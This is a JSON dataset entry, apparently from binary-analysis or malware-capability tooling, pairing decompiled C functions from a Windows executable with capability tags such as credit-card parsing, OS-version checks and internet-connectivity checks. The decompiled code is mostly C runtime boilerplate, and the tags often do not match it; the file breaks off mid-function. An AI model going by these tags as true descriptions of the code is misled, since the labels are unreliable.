{
    "null": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_558h\n\nuint main(void)\n\n{\n    double dVar1;\n    uint32_t uVar2;\n    float10 fVar3;\n    uint var_558h;\n    uint var_554h;\n    int32_t var_550h;\n    uint32_t var_54ch;\n    int32_t var_534h;\n    uint var_524h;\n    uint var_518h;\n    uint var_514h;\n    int32_t var_4fch;\n    uint var_4f8h;\n    double adStack1252 [78];\n    double adStack628 [78];\n    \n    if (*0x412be0 != 0xd6) {\n        fcn.00401815(\"PAUSE\");\n    }\n    adStack1252[0] = *0x40e1f0;\n    fcn.00401758(\"hollow    principle   stove\\n\", var_558h);\n    dVar1 = *0x40e1e8;\n    if ((*(**0x412c1c + 0xb) != '.') && (*(**0x412c1c + 3) != 'o')) {\n        (*0x411000)();\n    }\n    adStack1252[27] = adStack1252[0];\n    for (var_54ch = 1; var_54ch < 0x4d; var_54ch = var_54ch + 1) {\n        uVar2 = var_54ch & 0x80000003;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffffc) + 1;\n        }\n        if (uVar2 == 0) {\n            adStack1252[var_54ch] =\n                 ((var_54ch / 2) * (adStack1252[0] - adStack1252[0])) / (var_534h + 1) + adStack1252[0];\n        }\n        else {\n            adStack1252[var_54ch] = adStack1252[var_54ch + 1] - dVar1;\n        }\n    }\n    for (var_550h = 1; var_550h < 0x4d; var_550h = var_550h + 1) {\n        fVar3 = fcn.00401070(adStack1252[var_550h]);\n        adStack628[var_550h] = fVar3;\n    }\n    for (var_4fch = 1; var_4fch < 0x4d; var_4fch = var_4fch + 1) {\n    }\n    fcn.0040dee6();\n    return 0;\n}\n",
        "token_count": 605
    },
    "00404457": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404457(int32_t arg_8h, uint8_t *arg_ch, uint arg_10h, int32_t **arg_14h)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint8_t *puVar11;\n    int32_t *piVar12;\n    int32_t **ppiVar13;\n    bool bVar14;\n    int64_t iVar15;\n    int32_t *var_280h;\n    int32_t *var_27ch;\n    uint var_278h;\n    int32_t var_274h;\n    int32_t var_270h;\n    uint var_26ch;\n    uchar *var_268h;\n    char *var_260h;\n    uint var_25ch;\n    int32_t var_254h;\n    uint var_250h;\n    int32_t var_24ch;\n    int32_t *var_248h;\n    int32_t var_244h;\n    uint8_t *var_240h;\n    int32_t var_23ch;\n    int32_t *var_238h;\n    int32_t var_234h;\n    int32_t var_230h;\n    uint var_22ch;\n    uchar *var_228h;\n    int32_t var_224h;\n    int32_t *var_220h;\n    int32_t **var_21ch;\n    int32_t *var_218h;\n    uint8_t var_211h;\n    uint32_t var_210h;\n    uint var_20ch;\n    uchar var_dh;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    var_230h = arg_8h;\n    var_21ch = arg_14h;\n    var_24ch = 0;\n    var_210h = 0;\n    var_238h = NULL;\n    var_218h = NULL;\n    var_234h = 0;\n    var_244h = 0;\n    var_23ch = 0;\n    fcn.004023de(arg_10h);\n    var_26ch = fcn.00403a1e();\n    if (arg_8h != 0) {\n        if ((*(arg_8h + 0xc) & 0x40) == 0) {\n            uVar5 = fcn.00408222(arg_8h);\n            if ((uVar5 == 0xffffffff) || (uVar5 == 0xfffffffe)) {\n                iVar10 = 0x412070;\n            }\n            else {\n                iVar10 = (uVar5 & 0x1f) * 0x40 + *((uVar5 >> 5) * 4 + 0x4138a0);\n            }\n            if ((*(iVar10 + 0x24) & 0x7f) == 0) {\n                if ((uVar5 == 0xffffffff) || (uVar5 == 0xfffffffe)) {\n                    iVar10 = 0x412070;\n                }\n                else {\n                    iVar10 = (uVar5 & 0x1f) * 0x40 + *((uVar5 >> 5) * 4 + 0x4138a0);\n                }\n                if ((*(iVar10 + 0x24) & 0x80) == 0) goto code_r0x0040455c;\n            }\n        }\n        else {\ncode_r0x0040455c:\n            if (arg_ch != NULL) {\n                var_211h = *arg_ch;\n                var_224h = 0;\n                var_228h = NULL;\n                var_248h = NULL;\n                iVar10 = 0;\n                ppiVar13 = var_21ch;\n                while ((var_21ch = ppiVar13,  var_211h != 0 &&\n                       (puVar11 = arg_ch + 1,  var_240h = puVar11,  -1 < var_224h))) {\n                    if (var_211h - 0x20 < 0x59) {\n                        uVar5 = *(var_211h + 0x40ed40) & 0xf;\n                    }\n                    else {\n                        uVar5 = 0;\n                    }\n                    var_274h = *(iVar10 + 0x40ed60 + uVar5 * 8) >> 4;\n    // switch table (8 cases) at 0x40503f\n                    switch(var_274h) {\n                    case 0:\ncode_r0x004047d9:\n                        var_23ch = 0;\n                        iVar10 = fcn.0040851e(var_211h, &var_25ch);\n                        if (iVar10 != 0) {\n                            fcn.004043c2();\n                            var_240h = arg_ch + 2;\n                            if (*puVar11 == 0) goto code_r0x004044cd;\n                        }\n                        fcn.004043c2();\n                        break;\n                    case 1:\n                        var_218h = 0xffffffff;\n                        var_278h = 0;\n                        var_244h = 0;\n                        var_238h = NULL;\n                        var_234h = 0;\n                        var_210h = 0;\n                        var_23ch = 0;\n                        break;\n                    case 2:\n                        if (var_211h == 0x20) {\n                            var_210h = var_210h | 2;\n                        }\n                        else if (var_211h == 0x23) {\n                            var_210h = var_210h | 0x80;\n                        }\n                        else if (var_211h == 0x2b) {\n                            var_210h = var_210h | 1;\n                        }\n                        else if (var_211h == 0x2d) {\n                            var_210h = var_210h | 4;\n                        }\n                        else if (var_211h == 0x30) {\n                            var_210h = var_210h | 8;\n                        }\n                        break;\n                    case 3:\n                        if (var_211h == 0x2a) {\n                            var_238h = *arg_14h;\n                            var_21ch = arg_14h + 1;\n                            if (var_238h < 0) {\n                                var_210h = var_210h | 4;\n                                var_238h = -var_238h;\n                            }\n                        }\n                        else {\n                            var_238h = var_238h * 10 + -0x30 + var_211h;\n                        }\n                        break;\n                    case 4:\n                        var_218h = NULL;\n                        break;\n                    case 5:\n                        if (var_211h == 0x2a) {\n                            var_218h = *arg_14h;\n                            var_21ch = arg_14h + 1;\n                            if (var_218h < 0) {\n                                var_218h = 0xffffffff;\n                            }\n                        }\n                        else {\n                            var_218h = var_218h * 10 + -0x30 + var_211h;\n                        }\n                        break;\n                    case 6:\n                        if (var_211h == 0x49) {\n                            uVar1 = *puVar11;\n                            if ((uVar1 == 0x36) && (arg_ch[2] == 0x34)) {\n                                var_210h = var_210h | 0x8000;\n                                var_240h = arg_ch + 3;\n                            }\n                            else if ((uVar1 == 0x33) && (arg_ch[2] == 0x32)) {\n                                var_210h = var_210h & 0xffff7fff;\n                                var_240h = arg_ch + 3;\n                            }\n                            else if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&\n                                     ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {\n                                var_274h = 0;\n                                goto code_r0x004047d9;\n                            }\n                        }\n                        else if (var_211h == 0x68) {\n                            var_210h = var_210h | 0x20;\n                        }\n                        else if (var_211h == 0x6c) {\n                            if (*puVar11 == 0x6c) {\n                                var_210h = var_210h | 0x1000;\n                                var_240h = arg_ch + 2;\n                            }\n                            else {\n                                var_210h = var_210h | 0x10;\n                            }\n                        }\n                        else if (var_211h == 0x77) {\n                            var_210h = var_210h | 0x800;\n                        }\n                        break;\n                    case 7:\n                        if (var_211h < 'e') {\n                            if (var_211h == 100) {\ncode_r0x00404a9d:\n                                var_210h = var_210h | 0x40;\ncode_r0x00404aa4:\n                                ppiVar13 = arg_14h;\n                                var_228h = 0xa;\ncode_r0x00404aae:\n                                if (((var_210h & 0x8000) == 0) && ((var_210h & 0x1000) == 0)) {\n                                    var_21ch = ppiVar13 + 1;\n                                    if ((var_210h & 0x20) == 0) {\n                                        piVar12 = *ppiVar13;\n                                        if ((var_210h & 0x40) == 0) {\n                                            piVar8 = NULL;\n                                        }\n                                        else {\n                                            piVar8 = piVar12 >> 0x1f;\n                                        }\n                                    }\n                                    else {\n                                        if ((var_210h & 0x40) == 0) {\n                                            piVar12 = *ppiVar13;\n                                        }\n                                        else {\n                                            piVar12 = *ppiVar13;\n                                        }\n                                        piVar8 = piVar12 >> 0x1f;\n                                    }\n                                }\n                                else {\n                                    piVar12 = *ppiVar13;\n                                    piVar8 = ppiVar13[1];\n                                    var_21ch = ppiVar13 + 2;\n                                }\n                                if ((((var_210h & 0x40) != 0) && (piVar8 < 1)) && (piVar8 < 0)) {\n                                    bVar14 = piVar12 != NULL;\n                                    piVar12 = -piVar12;\n                                    piVar8 = -(piVar8 + bVar14);\n                                    var_210h = var_210h | 0x100;\n                                }\n                                if ((var_210h & 0x9000) == 0) {\n                                    piVar8 = NULL;\n                                }\n                                iVar15 = CONCAT44(piVar8, piVar12);\n                                if (var_218h < 0) {\n                                    var_218h = 0x1;\n                                }\n                                else {\n                                    var_210h = var_210h & 0xfffffff7;\n                                    if (0x200 < var_218h) {\n                                        var_218h = 0x200;\n                                    }\n                                }\n                                if ((piVar12 | piVar8) == 0) {\n                                    var_234h = 0;\n                                }\n                                piVar12 = &var_dh;\n                                while( true ) {\n                                    pcVar9 = iVar15;\n                                    piVar8 = var_218h + -1;\n                                    if ((var_218h < 1) && (iVar15 == 0)) break;\n                                    var_218h = piVar8;\n                                    iVar15 = fcn.00408570();\n                                    iVar10 = extraout_ECX + 0x30;\n                                    if (0x39 < iVar10) {\n                                        iVar10 = iVar10 + var_24ch;\n                                    }\n                                    *piVar12 = iVar10;\n                                    piVar12 = piVar12 + -1;\n                                    var_260h = pcVar9;\n                                }\n                                var_228h = &var_dh + -piVar12;\n                                var_220h = piVar12 + 1;\n                                var_218h = piVar8;\n                                if (((var_210h & 0x200) != 0) && ((var_228h == NULL || (*var_220h != '0')))) {\n                                    *piVar12 = '0';\n                                    var_228h = &var_ch + -piVar12;\n                                    var_220h = piVar12;\n                                }\n                            }\n                            else if (var_211h < 'T') {\n                                if (var_211h == 0x53) {\n                                    if ((var_210h & 0x830) == 0) {\n                                        var_210h = var_210h | 0x800;\n                                    }\n                                    goto code_r0x004048b2;\n                                }\n                                if (var_211h == 0x41) {\ncode_r0x00404865:\n                                    var_211h = var_211h + 0x20;\n                                    var_278h = 1;\ncode_r0x00404ad3:\n                                    var_210h = var_210h | 0x40;\n                                    var_260h = 0x200;\n                                    piVar8 = &var_20ch;\n                                    pcVar9 = var_260h;\n                                    piVar12 = &var_20ch;\n                                    if (var_218h < 0) {\n                                        var_218h = 0x6;\n                                    }\n                                    else if (var_218h == NULL) {\n                                        if (var_211h == 0x67) {\n                                            var_218h = 0x1;\n                                        }\n                                    }\n                                    else {\n                                        if (0x200 < var_218h) {\n                                            var_218h = 0x200;\n                                        }\n                                        if (0xa3 < var_218h) {\n                                            pcVar9 = var_218h + 0x15d;\n                                            var_220h = &var_20ch;\n                                            var_248h = fcn.004075b7(pcVar9);\n                                            piVar8 = var_248h;\n                                            piVar12 = var_248h;\n                                            if (var_248h == NULL) {\n                                                var_218h = 0xa3;\n                                                piVar8 = &var_20ch;\n                                                pcVar9 = var_260h;\n                                                piVar12 = var_220h;\n                                            }\n                                        }\n                                    }\n                                    var_220h = piVar12;\n                                    var_260h = pcVar9;\n                                    pcVar7 = _sym.imp.KERNEL32.dll_DecodePointer;\n                                    var_280h = *arg_14h;\n                                    var_21ch = arg_14h + 2;\n                                    var_27ch = arg_14h[1];\n                                    pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)\n                                                       (*0x411b24, &var_280h, piVar8, var_260h, var_211h, var_218h, \n                                                        var_278h, &var_25ch);\n                                    (*pcVar6)();\n                                    uVar5 = var_210h & 0x80;\n                                    if ((uVar5 != 0) && (var_218h == NULL)) {\n                                        pcVar6 = (*pcVar7)(*0x411b30, piVar8, &var_25ch);\n                                        (*pcVar6)();\n                                    }\n                                    if ((var_211h == 0x67) && (uVar5 == 0)) {\n                                        pcVar7 = (*pcVar7)(*0x411b2c, piVar8, &var_25ch);\n                                        (*pcVar7)();\n                                    }\n                                    if (*piVar8 == '-') {\n                                        var_210h = var_210h | 0x100;\n                                        var_220h = piVar8 + 1;\n                                        piVar8 = var_220h;\n                                    }\ncode_r0x004049ea:\n                                    var_228h = fcn.004070f0(piVar8);\n                                }\n                                else if (var_211h == 0x43) {\n                                    ppiVar13 = arg_14h;\n                                    if ((var_210h & 0x830) == 0) {\n                                        var_210h = var_210h | 0x800;\n                                    }\ncode_r0x0040492b:\n                                    var_21ch = ppiVar13 + 1;\n                                    if ((var_210h & 0x810) == 0) {\n                                        var_20ch._0_1_ = *ppiVar13;\n                                        var_228h = 0x1;\n                                    }\n                                    else {\n                                        iVar10 = fcn.00408501(&var_228h, &var_20ch, 0x200, *ppiVar13);\n                                        if (iVar10 != 0) {\n                                            var_244h = 1;\n                                        }\n                                    }\n                                    var_220h = &var_20ch;\n                                }\n                                else if ((var_211h == 0x45) || (var_211h == 0x47)) goto code_r0x00404865;\n                            }\n                            else {\n                                if (var_211h == 0x58) goto code_r0x00404c33;\n                                if (var_211h == 0x5a) {\n                                    piVar12 = *arg_14h;\n                                    var_21ch = arg_14h + 1;\n                                    piVar8 = *0x412050;\n                                    var_220h = *0x412050;\n                                    if ((piVar12 == NULL) || (piVar3 = piVar12[1],  piVar3 == NULL))\n                                    goto code_r0x004049ea;\n                                    var_228h = *piVar12;\n                                    var_220h = piVar3;\n                                    if ((var_210h & 0x800) == 0) {\n                                        var_23ch = 0;\n                                    }\n                                    else {\n                                        var_228h = var_228h / 2;\n                                        var_23ch = 1;\n                                    }\n                                }\n                                else {\n                                    if (var_211h == 0x61) goto code_r0x00404ad3;\n                                    if (var_211h == 99) goto code_r0x0040492b;\n                                }\n                            }\ncode_r0x00404e10:\n                            if (var_244h == 0) {\n                                if ((var_210h & 0x40) != 0) {\n                                    if ((var_210h & 0x100) == 0) {\n                                        if ((var_210h & 1) == 0) {\n                                            if ((var_210h & 2) == 0) goto code_r0x00404e5d;\n                                            var_22ch._0_1_ = 0x20;\n                                        }\n                                        else {\n                                            var_22ch._0_1_ = 0x2b;\n                                        }\n                                    }\n                                    else {\n                                        var_22ch._0_1_ = 0x2d;\n                                    }\n                                    var_234h = 1;\n                                }\ncode_r0x00404e5d:\n                                pcVar9 = var_238h + (-var_234h - var_228h);\n                                var_260h = pcVar9;\n                                if ((var_210h & 0xc) == 0) {\n                                    do {\n                                        if (pcVar9 < 1) break;\n                                        pcVar9 = pcVar9 + -1;\n                                        fcn.004043c2();\n                                    } while (var_224h != -1);\n                                }\n                                fcn.004043f5(&var_22ch, var_234h);\n                                if (((var_210h & 8) != 0) && (pcVar9 = var_260h,  (var_210h & 4) == 0)) {\n                                    do {\n                                        if (pcVar9 < 1) break;\n                                        fcn.004043c2();\n                                        pcVar9 = pcVar9 + -1;\n                                    } while (var_224h != -1);\n                                }\n                                if ((var_23ch == 0) || (var_228h < 1)) {\n                                    fcn.004043f5(var_220h, var_228h);\n                                }\n                                else {\n                                    var_268h = var_228h;\n                                    piVar12 = var_220h;\n                                    do {\n                                        iVar2 = *piVar12;\n                                        var_268h = var_268h + -1;\n                                        piVar12 = piVar12 + 2;\n                                        iVar10 = fcn.00408501(&var_270h, &var_ch, 6, iVar2);\n                                        if ((iVar10 != 0) || (var_270h == 0)) {\n                                            var_224h = -1;\n                                            break;\n                                        }\n                                        fcn.004043f5(&var_ch, var_270h);\n                                    } while (var_268h != NULL);\n                                }\n                                if ((-1 < var_224h) && (pcVar9 = var_260h,  (var_210h & 4) != 0)) {\n                                    do {\n                                        if (pcVar9 < 1) break;\n                                        fcn.004043c2();\n                                        pcVar9 = pcVar9 + -1;\n                                    } while (var_224h != -1);\n                                }\n                            }\n                        }\n                        else {\n                            if ('p' < var_211h) {\n                                if (var_211h == 0x73) {\ncode_r0x004048b2:\n                                    piVar12 = var_218h;\n                                    if (var_218h == 0xffffffff) {\n                                        piVar12 = 0x7fffffff;\n                                    }\n                                    var_21ch = arg_14h + 1;\n                                    var_220h = *arg_14h;\n                                    if ((var_210h & 0x810) == 0) {\n                                        piVar8 = var_220h;\n                                        if (var_220h == NULL) {\n                                            piVar8 = *0x412050;\n                                            var_220h = *0x412050;\n                                        }\n                                        for (; (piVar12 != NULL && (piVar12 = piVar12 + -1,  *piVar8 != '\\0'));\n                                            piVar8 = piVar8 + 1) {\n                                        }\n                                        var_228h = piVar8 - var_220h;\n                                    }\n                                    else {\n                                        if (var_220h == NULL) {\n                                            var_220h = *0x412054;\n                                        }\n                                        var_23ch = 1;\n                                        for (piVar8 = var_220h;\n                                            (piVar12 != NULL && (piVar12 = piVar12 + -1,  *piVar8 != 0));\n                                            piVar8 = piVar8 + 2) {\n                                        }\n                                        var_228h = piVar8 - var_220h >> 1;\n                                    }\n                                    goto code_r0x00404e10;\n                                }\n                                if (var_211h == 0x75) goto code_r0x00404aa4;\n                                if (var_211h != 0x78) goto code_r0x00404e10;\n                                var_24ch = 0x27;\ncode_r0x00404c65:\n                                var_228h = 0x10;\n                                if ((var_210h & 0x80) != 0) {\n                                    var_22ch._1_1_ = var_24ch + 'Q';\n                                    var_22ch._0_1_ = 0x30;\n                                    var_234h = 2;\n                                }\n                                goto code_r0x00404aae;\n                            }\n                            if (var_211h == 0x70) {\n                                var_218h = 0x8;\ncode_r0x00404c33:\n                                var_24ch = 7;\n                                ppiVar13 = arg_14h;\n                                goto code_r0x00404c65;\n                            }\n                            if (var_211h < 'e') goto code_r0x00404e10;\n                            arg_14h = ppiVar13;\n                            if (var_211h < 'h') goto code_r0x00404ad3;\n                            if (var_211h == 0x69) goto code_r0x00404a9d;\n                            if (var_211h != 0x6e) {\n                                if (var_211h != 0x6f) goto code_r0x00404e10;\n                                var_228h = 0x8;\n                                if ((var_210h & 0x80) != 0) {\n                                    var_210h = var_210h | 0x200;\n                                }\n                                goto code_r0x00404aae;\n                            }\n                            var_21ch = ppiVar13 + 1;\n                            piVar12 = *ppiVar13;\n                            iVar10 = fcn.004017ff();\n                            if (iVar10 == 0) goto code_r0x004044cd;\n                            if ((var_210h & 0x20) == 0) {\n                                *piVar12 = var_224h;\n                            }\n                            else {\n                                *piVar12 = var_224h;\n                            }\n                            var_244h = 1;\n                        }\n                        if (var_248h != NULL) {\n                            fcn.0040505f(var_248h);\n                            var_248h = NULL;\n                        }\n                    }\n                    var_211h = *var_240h;\n                    iVar10 = var_274h;\n                    arg_ch = var_240h;\n                    arg_14h = var_21ch;\n                    ppiVar13 = var_21ch;\n                }\n                if (var_250h != '\\0') {\n                    *(var_254h + 0x70) = *(var_254h + 0x70) & 0xfffffffd;\n                }\n                goto code_r0x0040502f;\n            }\n        }\n    }\ncode_r0x004044cd:\n    puVar4 = fcn.00403a1e();\n    *puVar4 = 0x16;\n    fcn.00403521();\n    if (var_250h != '\\0') {\n        *(var_254h + 0x70) = *(var_254h + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040502f:\n    fcn.00405fff(unaff_EBX);\n    return;\n}\n",
        "token_count": 5958
    },
    "004015b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004016b6: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004016bb)\n// WARNING: Removing unreachable block (ram,0x004016ea)\n// WARNING: Removing unreachable block (ram,0x004016c1)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004015b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403d40(0x40ff50, 0x20);\n    fcn.004030f7(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x412c44 != 1) {\n        *0x412c40 = 1;\n        *0x412c3c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x4149d8);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x4149d4);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00403568();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00403568();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x4149d8);\n                        piVar2 = (*pcVar1)(*0x4149d4);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x40e178;\n            while (*(unaff_EBP + -0x1c) < 0x40e188) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x40e18c;\n        while (*(unaff_EBP + -0x20) < 0x40e190) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040301e(8);\n    }\n    return;\n}\n",
        "token_count": 1017
    },
    "00401815": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401815(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    char *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    var_4h = NULL;\n    uVar4 = 0;\n    iVar1 = fcn.00405666(&var_4h, 0, \"COMSPEC\");\n    if ((iVar1 != 0) && (iVar1 == 0x16)) {\n        fcn.004034cf(0, 0, 0, 0, 0);\n    }\n    var_14h = var_4h;\n    if (arg_8h == 0) {\n        if (var_4h != NULL) {\n            iVar1 = fcn.00405560(var_4h, 0);\n            uVar4 = iVar1 == 0;\n        }\n        goto code_r0x004018e3;\n    }\n    var_10h = 0x40e234;\n    var_ch = arg_8h;\n    var_8h = 0;\n    if (var_4h != NULL) {\n        piVar2 = fcn.00403a1e();\n        iVar1 = *piVar2;\n        puVar3 = fcn.00403a1e();\n        *puVar3 = 0;\n        uVar4 = fcn.00405377(0, var_14h, &var_14h, 0);\n        piVar2 = fcn.00403a1e();\n        if (uVar4 != 0xffffffff) {\n            *piVar2 = iVar1;\n            goto code_r0x004018e3;\n        }\n        if ((*piVar2 != 2) && (piVar2 = fcn.00403a1e(),  *piVar2 != 0xd)) goto code_r0x004018e3;\n        piVar2 = fcn.00403a1e();\n        *piVar2 = iVar1;\n    }\n    var_14h = \"cmd.exe\";\n    uVar4 = fcn.00405099(0, \"cmd.exe\", &var_14h, 0);\ncode_r0x004018e3:\n    fcn.0040505f(var_4h);\n    return uVar4;\n}\n",
        "token_count": 551
    },
    "0042e0ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid loc.0042e0ab(uint param_1)\n\n{\n    if (*0x412c54 == 1) {\n        fcn.00404104();\n    }\n    fcn.00403f55(param_1);\n    fcn.00401498(0xff);\n    return;\n}\n",
        "token_count": 65
    },
    "00401f52": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f52(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    \n    if (arg_8h == 1) {\n        puVar1 = fcn.00403a1e();\n        *puVar1 = 0x21;\n    }\n    else if ((1 < arg_8h) && (arg_8h < 4)) {\n        puVar1 = fcn.00403a1e();\n        *puVar1 = 0x22;\n        return;\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "004020a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004020a8(uint param_1, uint param_2, ulong param_3, ulong param_4, uint param_5)\n\n{\n    int32_t iVar1;\n    uint in_stack_ffffff70;\n    \n    iVar1 = fcn.00401d6e(param_1, &param_4, param_5);\n    if (iVar1 == 0) {\n        fcn.00401a92(&stack0xffffff70, &param_5, param_1, param_2, &param_3, &param_4, 0);\n    }\n    iVar1 = fcn.00401f7f(param_1);\n    if ((*0x4120b0 == 0) && (iVar1 != 0)) {\n        fcn.00401fb3(iVar1, param_2, param_3, param_3 >> 0x20, 0, 0, param_4, param_4 >> 0x20, param_5);\n    }\n    else {\n        fcn.00401f52(iVar1);\n        fcn.004022e9(param_5, 0xffff);\n    }\n    fcn.00405fff(in_stack_ffffff70);\n    return;\n}\n",
        "token_count": 270
    },
    "00402577": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402577(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.00406cd2(&arg_8h, arg_10h, arg_14h);\n        *arg_ch = arg_8h;\n    }\n    else {\n        fcn.00406c2a(&var_8h, arg_10h, arg_14h);\n        *arg_ch = var_8h;\n        arg_ch[1] = var_4h;\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00402618": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00402618(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar *in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    uint uVar7;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004023de(arg_1ch);\n    if ((in_EAX == NULL) || (arg_8h == 0)) {\n        puVar2 = fcn.00403a1e();\n        uVar7 = 0x16;\n    }\n    else {\n        iVar3 = arg_ch;\n        if (arg_ch < 1) {\n            iVar3 = 0;\n        }\n        if (iVar3 + 9U < arg_8h) {\n            if (arg_18h != '\\0') {\n                fcn.004025d3();\n            }\n            puVar6 = in_EAX;\n            if (*arg_14h == 0x2d) {\n                *in_EAX = 0x2d;\n                puVar6 = in_EAX + 1;\n            }\n            if (0 < arg_ch) {\n                *puVar6 = puVar6[1];\n                puVar6 = puVar6 + 1;\n                *puVar6 = ***(var_10h + 0xbc);\n            }\n            puVar6 = puVar6 + (arg_18h == '\\0') + arg_ch;\n            if (arg_8h == 0xffffffff) {\n                puVar5 = 0xffffffff;\n            }\n            else {\n                puVar5 = in_EAX + (arg_8h - puVar6);\n            }\n            iVar3 = fcn.0040717b(puVar6, puVar5, \"e+000\");\n            if (iVar3 == 0) {\n                if (arg_10h != 0) {\n                    *puVar6 = 0x45;\n                }\n                if (*arg_14h[3] != '0') {\n                    iVar3 = arg_14h[1] + -1;\n                    if (iVar3 < 0) {\n                        iVar3 = -iVar3;\n                        puVar6[1] = 